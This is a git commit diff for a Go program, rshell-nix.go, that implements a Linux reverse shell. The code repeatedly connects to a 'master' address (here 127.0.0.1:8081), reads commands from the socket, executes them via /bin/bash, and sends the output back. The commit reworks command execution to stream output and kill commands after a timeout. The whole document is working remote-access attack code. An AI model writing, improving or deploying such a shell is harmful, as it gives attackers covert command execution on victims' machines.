df595bd8d5e96df0f66a4e26b4741cbd30ec0fe6
xiaobai <422145328@qq.com>
2016-10-20 21:14:23 +0800

    更新shell执行方式

--- rshell-nix.go
+++ rshell-nix.go
@@ -1,50 +1,80 @@
 package main
 
 import (
-    "fmt"
-    "os/exec"
-    "log"
-    "net"
-    "bufio"
-    "time"
+	"bufio"
+	"fmt"
+	"net"
+	"os/exec"
+	"time"
 )
 
-func reverseshell(addr string){
+// 等待时间，单位秒
+var waitTime int64 = 10
 
-    chk_conn:
-    // make sure the master is online
-    for{
-        c, e := net.Dial("tcp", addr)
-        if e != nil {
-            time.Sleep(3 * time.Second)
-        } else {
-            c.Close()
-            break
-        }
-    }
+func reverseshell(addr string) {
 
-    // now send out our shell
-    conn,_:= net.Dial("tcp", addr)
-    for{
-        status, disconn := bufio.NewReader(conn).ReadString('\n');
-        if disconn != nil {
-            goto chk_conn
-            break
-        }
-        out,err := exec.Command("/bin/bash", "-c", status).Output()
-        //cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-        //out, _ := cmd.Output();
-        if err != nil {
-            log.Fatal(err)
-        } else {
-            fmt.Printf(string(out))
-            conn.Write([]byte(out))
-        }
-    }
+chk_conn:
+	// make sure the master is online
+	for {
+		c, e := net.Dial("tcp", addr)
+		if e != nil {
+			time.Sleep(3 * time.Second)
+		} else {
+			c.Close()
+			break
+		}
+	}
+
+	// now send out our shell
+	conn, _ := net.Dial("tcp", addr)
+	for {
+		status, disconn := bufio.NewReader(conn).ReadString('\n')
+		if disconn != nil {
+			goto chk_conn
+			break
+		}
+
+		textChan := make(chan string)
+		cmd := exec.Command("/bin/bash", "-c", status)
+		cmdReader, err := cmd.StdoutPipe()
+		if err != nil {
+			fmt.Println("\033[31;1m Error creating StdoutPipe for Cmd", err)
+		}
+
+		//转发sh的输出结果
+		scanner := bufio.NewScanner(cmdReader)
+		go func(cmd *exec.Cmd) {
+			var startTime = time.Now().Unix()
+			var ouTtext string
+			for scanner.Scan() {
+				nowTime := time.Now().Unix()
+				if ouTtext != "" {
+					ouTtext = ouTtext + "\n"
+				}
+				ouTtext = ouTtext + scanner.Text()
+				if nowTime-startTime > waitTime {
+					cmd.Process.Kill()
+				}
+			}
+			textChan <- ouTtext
+		}(cmd)
+
+		//执行
+		err = cmd.Start()
+		if err != nil {
+			fmt.Println("\033[31;1mStart for Cmd", err)
+		}
+
+		// 等待程序结束
+		_ = cmd.Wait()
+		var out string
+		out = <-textChan
+		conn.Write([]byte(out))
+	}
 }
 
 func main() {
-    var master_ip string
-    master_ip = "127.0.0.1:8081"
-    reverseshell(master_ip)
+	var master_ip string
+	master_ip = "127.0.0.1:8081"
+	reverseshell(master_ip)
 }
